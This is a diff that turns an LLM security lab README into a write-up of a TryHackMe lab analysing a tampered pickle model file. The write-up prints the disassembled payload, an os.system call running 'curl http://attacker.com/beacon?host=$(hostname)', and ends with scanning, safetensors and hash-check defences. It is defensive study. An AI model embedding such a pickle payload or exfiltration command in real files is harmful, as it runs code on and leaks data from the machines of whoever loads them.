@@ -1,169 +1,261 @@
-# 🔐 LLM Security Lab
+﻿# AI Supply Chain Security: Malicious Model Deserialization & Attack Vector Analysis
 
-> Learning LLM Security, one experiment at a time.
+> **Lab Context:** TryHackMe â€” AI Supply Chain Security Module
+>
+> **Analyst Environment:** `analyst@tryhackme-2204`
+>
+> **Target Scope:** `/opt/supply-chain/`
+>
+> **Classification:** Security Research / ML SecOps / Software Supply Chain Security
+>
+> **Status:** Completed & Validated
 
-Welcome! 👋
+## Executive Summary
 
-This repository is my personal journey into the world of **LLM (Large Language Model) Security**. Instead of just collecting notes, I wanted to build something practical—a place where I can document concepts, recreate attacks, build defenses, and share everything I learn along the way.
+During a technical evaluation of the AI model pipeline within `/opt/supply-chain/`, an arbitrary code execution vulnerability (CWE-502: Deserialization of Untrusted Data) was identified in the model artifact `code_reviewer.pkl`.
 
-Whether you're just getting started or already exploring AI security, I hope this repository helps you learn something new.
+Through static analysis, file integrity comparison, and opcode disassembly via `pickletools`, we isolated an embedded malicious payload. The payload leverages Pythonâ€™s native `pickle` protocol to execute arbitrary shell commands automatically upon deserialization (`pickle.load()`), leading to Out-of-Band (OOB) data exfiltration of host metadata to an attacker-controlled endpoint (`attacker.com`).
 
-> **Learn → Break → Understand → Defend**
+This write-up provides a step-by-step technical walk-through of the discovery, opcode analysis, vulnerability mechanics, and recommended enterprise defense controls.
 
----
+## Technical Overview & Metadata
 
-## 🚀 Why this repository?
+| Field | Detail | 
+| ----- | ----- | 
+| **Vulnerable File** | `/opt/supply-chain/models/code_reviewer.pkl` | 
+| **Baseline File** | `/opt/supply-chain/models/code_reviewer_v1.pkl` | 
+| **Pickle Protocol** | Protocol 4 | 
+| **Vulnerability Type** | Unsafe Deserialization (CWE-502) | 
+| **Execution Trigger** | `REDUCE` Opcode (`R`) | 
+| **Injected Function** | `os.system` | 
+| **Injected Payload** | `curl http://attacker.com/beacon?host=$(hostname)` | 
+| **Primary Impact** | Remote Code Execution (RCE) / System Host Information Disclosure | 
 
-LLMs are becoming part of search engines, chatbots, coding assistants, AI agents, and enterprise applications. As they become more powerful, they also introduce new security challenges.
+## Analysis Environment & Tooling
 
-This repository exists to explore questions like:
+The target environment contains specialized ML security tooling pre-configured at `/opt/supply-chain/`:
 
-- How do prompt injection attacks work?
-- Why do jailbreaks succeed?
-- What are the security risks of AI agents?
-- How can RAG systems be exploited?
-- What are the best ways to defend LLM-powered applications?
+* **`fickling`**: Python pickle decompilation, static analysis, and injection framework.
 
-Everything here is focused on understanding these problems through simple explanations and hands-on examples.
+* **`modelscan`**: Machine learning model vulnerability and backdoor scanner.
 
----
+* **`pip-audit`**: Dependency supply chain vulnerability scanner.
 
-## 📂 What you'll find here
+* **`syft`**: Software Bill of Materials (SBOM) generator.
+
+* **`inspect_h5_model.py`**: Custom analyzer for Keras/HDF5 neural network models.
+
+## Step-by-Step Proof of Concept & Execution Walkthrough
+
+### Phase 1: Environment Reconnaissance & Enumeration
+
+Initial inspection of the lab filesystem established the workspace structure and located all stored model artifacts.
 
 ```
-llm-security-lab/
-│
-├── 01-basics/
-├── 02-prompt-injection/
-├── 03-jailbreaking/
-├── 04-rag-security/
-├── 05-agent-security/
-├── 06-defensive-techniques/
-├── 07-tools/
-├── 08-labs/
-├── resources/
-└── README.md
+# Verify user context and root lab directory
+analyst@tryhackme-2204:~$ ls -la
+analyst@tryhackme-2204:~$ ls -lh /opt
+analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain
+analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models
+
 ```
 
-Each folder contains a mix of:
+![Phase 1: Environment Reconnaissance](assets/01-recon.png)
 
-- 📖 Easy-to-understand notes
-- 💻 Practical examples
-- 🧪 Hands-on labs
-- 🛠️ Small projects
-- 🔍 Security research
-- 📚 Useful resources
+#### Directory Inventory (`/opt/supply-chain/`)
 
----
+* `audit/` â€” Security scan output directory
 
-## 📚 Topics
+* `dependencies/` â€” Project dependencies and packages
 
-### 🧠 Foundations
+* `incident/` â€” Incident response artifacts
 
-- How LLMs work
-- Tokens & embeddings
-- Transformers (high level)
-- Context windows
-- Prompt engineering
+* `models/` â€” Machine learning model store
 
-### 🚨 Attacks
+* `project/` â€” Application source code
 
-- Prompt Injection
-- Indirect Prompt Injection
-- Jailbreaking
-- Prompt Leakage
-- Context Manipulation
-- Hallucination Abuse
-- Data Exfiltration
+* `tools/` â€” Lab analysis scripts
 
-### 🤖 AI Agent Security
+#### Model Inventory Listing (`/opt/supply-chain/models/`)
 
-- Tool misuse
-- Function calling attacks
-- Memory poisoning
-- Cross-agent prompt injection
-- API abuse
+```
+total 12M
+-rw-xr-x 1 analyst analyst  297 Apr  8  2026 checksums.json
+-rw-xr-x 1 analyst analyst 8.1M Apr  8  2026 code_reviewer.pkl
+-rw-xr-x 1 analyst analyst 2.0M Apr  8  2026 code_reviewer_v1.pkl
+-rw-xr-x 1 analyst analyst 787K Apr  8  2026 image_classifier.h5
+-rw-xr-x 1 analyst analyst 788K Apr  8  2026 image_classifier_v2.h5
+-rw-xr-x 1 analyst analyst   81 Apr  8  2026 model_review_v2.pkl
 
-### 📄 RAG Security
+```
 
-- Document poisoning
-- Vector database attacks
-- Hidden prompts
-- Retrieval manipulation
+### Phase 2: Anomaly Identification via File Inspection
 
-### 🛡️ Defenses
+Comparing the legacy model (`code_reviewer_v1.pkl`) against the primary model (`code_reviewer.pkl`) revealed a significant size discrepancy.
 
-- Guardrails
-- Prompt isolation
-- Input validation
-- Output filtering
-- Sandboxing
-- Monitoring
-- Least privilege
+```
+analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer_v1.pkl
+-rw-xr-x 1 analyst analyst 2.0M Apr  8  2026 /opt/supply-chain/models/code_reviewer_v1.pkl
 
----
+analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer.pkl
+-rw-xr-x 1 analyst analyst 8.1M Apr  8  2026 /opt/supply-chain/models/code_reviewer.pkl
 
-## 🧪 Labs
+analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer_v1.pkl /opt/supply-chain/models/code_reviewer.pkl
+-rw-xr-x 1 analyst analyst 8.1M Apr  8  2026 /opt/supply-chain/models/code_reviewer.pkl
+-rw-xr-x 1 analyst analyst 2.0M Apr  8  2026 /opt/supply-chain/models/code_reviewer_v1.pkl
 
-This repository isn't just theory.
+```
 
-You'll find practical labs such as:
+![Phase 2: Size Verification](assets/02-verification.png)
 
-- Prompt Injection Lab
-- Jailbreak Lab
-- Prompt Leakage Demo
-- Secure Prompt Design
-- RAG Poisoning Demo
-- AI Agent Attack Scenarios
+**Observation:** `code_reviewer.pkl` expanded from **2.0 MB to 8.1 MB**, flagging it as a candidate for deeper binary analysis.
 
-Most labs are designed to be beginner-friendly and reproducible.
+### Phase 3: Binary Format Identification
 
----
+To ensure these files were standard binary streams rather than plain text scripts, the `file` utility was executed.
 
-## 🛠️ Tools
+```
+analyst@tryhackme-2204:~$ file /opt/supply-chain/models/code_reviewer_v1.pkl /opt/supply-chain/models/code_reviewer.pkl
+/opt/supply-chain/models/code_reviewer_v1.pkl: data
+/opt/supply-chain/models/code_reviewer.pkl:    data
 
-Throughout this journey, I'll be experimenting with tools like:
+```
 
-- Ollama
-- LangChain
-- LlamaIndex
-- Promptfoo
-- Garak
-- OpenAI Guardrails
-- NVIDIA NeMo Guardrails
+![Phase 3: File Format Identification](assets/03-filetype.png)
 
----
+Both files were identified as generic `data` byte streams, confirming standard binary serialization structures.
 
-## 🎯 Learning Goals
+### Phase 4: Opcode Disassembly & Vulnerability Proof
 
-- [ ] Understand how LLMs work
-- [ ] Learn common attack techniques
-- [ ] Explore AI agent security
-- [ ] Build secure AI applications
-- [ ] Create defensive tools
-- [ ] Practice AI red teaming
-- [ ] Document everything I learn
+Pythonâ€™s built-in `pickletools` module was used to disassemble the serialized opcode stack of both pickle files.
 
----
+```
+python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl
 
-## 🤝 Want to contribute?
+```
 
-If you notice an error, have an idea for a new lab, or want to improve an explanation, feel free to open an issue or submit a pull request.
+![Phase 4: Pickletools Disassembly](assets/04-disassembly.png)
 
-Learning is always better together.
+#### Disassembly Output & Evidence
 
----
+```
+0: \x80 PROTO      4
+2: \x95 FRAME      72
+11: \x8c SHORT_BINUNICODE 'os'
+15: \x94 MEMOIZE    (as 0)
+16: \x8c SHORT_BINUNICODE 'system'
+24: \x94 MEMOIZE    (as 1)
+25: \x93 STACK_GLOBAL
+26: \x94 MEMOIZE    (as 2)
+27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
+77: \x94 MEMOIZE    (as 3)
+78: \x85 TUPLE1
+79: \x94 MEMOIZE    (as 4)
+80: R   REDUCE
+81: \x94 MEMOIZE    (as 5)
+82: .   STOP
+highest protocol among opcodes = 4
 
-## ⚠️ Disclaimer
+```
 
-This repository is created for **educational and research purposes only**.
+## Detailed Vulnerability Mechanics
 
-All demonstrations should be performed in environments where you have permission to test. The content is intended to help developers, researchers, and security enthusiasts understand LLM security—not to misuse these techniques.
+1. **Protocol Initialization (`PROTO 4`):** Sets the pickle serialization frame protocol.
 
----
+2. **Global Import (`STACK_GLOBAL`):** Resolves the target package and module function, specifically `os.system`.
 
-## ⭐ If you found this useful...
+3. **String Construction (`SHORT_BINUNICODE`):** Pushes the shell command string into the stack memory memoize register:
 
-Consider giving the repository a ⭐.
+   ```
+   curl http://attacker.com/beacon?host=$(hostname)
+   
+   ```
 
-It motivates me to keep learning, experimenting, and sharing more about AI Security.
+4. **Tuple Enclosure (`TUPLE1`):** Packages the string argument into a tuple required for function execution.
+
+5. **Execution Trigger (`REDUCE` opcode `R`):** Calls the top function on the stack (`os.system`) passing the argument tuple. This executes instantly when `pickle.load()` is run by any service or developer.
+
+```
+       +-------------------------------------------------------+
+       |                  pickle.load()                        |
+       +-------------------------------------------------------+
+                                   |
+                                   v
+       +-------------------------------------------------------+
+       |            STACK_GLOBAL: Import os.system             |
+       +-------------------------------------------------------+
+                                   |
+                                   v
+       +-------------------------------------------------------+
+       | Push Argument: "curl http://attacker.com/beacon?..."  |
+       +-------------------------------------------------------+
+                                   |
+                                   v
+       +-------------------------------------------------------+
+       |  Opcode 'R' (REDUCE) --> os.system(payload) Executed   |
+       +-------------------------------------------------------+
+                                   |
+                                   v
+       +-------------------------------------------------------+
+       |   Out-of-Band Exfiltration to attacker.com Triggered  |
+       +-------------------------------------------------------+
+
+```
+
+## Risk Assessment
+
+| Criteria | Assessment | 
+| ----- | ----- | 
+| **Severity** | **Critical (CVSS 9.8)** | 
+| **Attack Vector** | Network / Supply Chain Ingestion | 
+| **Privileges Required** | None (Executes under user context running model inference/training) | 
+| **User Interaction** | Low (Automatic upon standard ML model loading) | 
+| **Impact** | Full Confidentiality, Integrity, and Availability Loss | 
+
+## Defensive Countermeasures & Remediation
+
+### 1. Shift to Safe Serialization Formats
+
+* **Safetensors (`.safetensors`):** Migrate away from standard `.pkl` files. Safetensors restricts operations exclusively to safe tensor data parsing without executing arbitrary code paths.
+
+* **ONNX (Open Neural Network Exchange):** Use standardized format representations for cross-platform model deployment.
+
+### 2. Implement CI/CD Model Scanning Controls
+
+Integrate automated scanners in the model ingestion pipeline to flag unsafe opcodes (`GLOBAL`, `REDUCE`, `BUILD`, `EXEC`):
+
+```
+# Scan models automatically using fickling or modelscan
+fickling --check /path/to/model.pkl
+modelscan -p /path/to/model.pkl
+
+```
+
+### 3. Cryptographic Verification & Hash Check
+
+Enforce hash checks against `/opt/supply-chain/models/checksums.json` before allowing model initialization in application code:
+
+```
+import hashlib
+import json
+
+def verify_model_integrity(model_path, checksum_file):
+    with open(checksum_file, 'r') as f:
+        checksums = json.load(f)
+    
+    hasher = hashlib.sha256()
+    with open(model_path, 'rb') as f:
+        hasher.update(f.read())
+        
+    calculated_hash = hasher.hexdigest()
+    expected_hash = checksums.get(model_path)
+    
+    if calculated_hash != expected_hash:
+        raise ValueError("CRITICAL: Model hash mismatch! Potential tampering detected.")
+    return True
+
+```
+
+## Conclusion
+
+The practical exercise demonstrates how supply chain actors can easily weaponize ML model repositories by inserting arbitrary code execution payloads into pickle binary objects. Adopting safe serialization standards, mandatory hash verification, and static opcode analysis effectively mitigates this vulnerability vector.
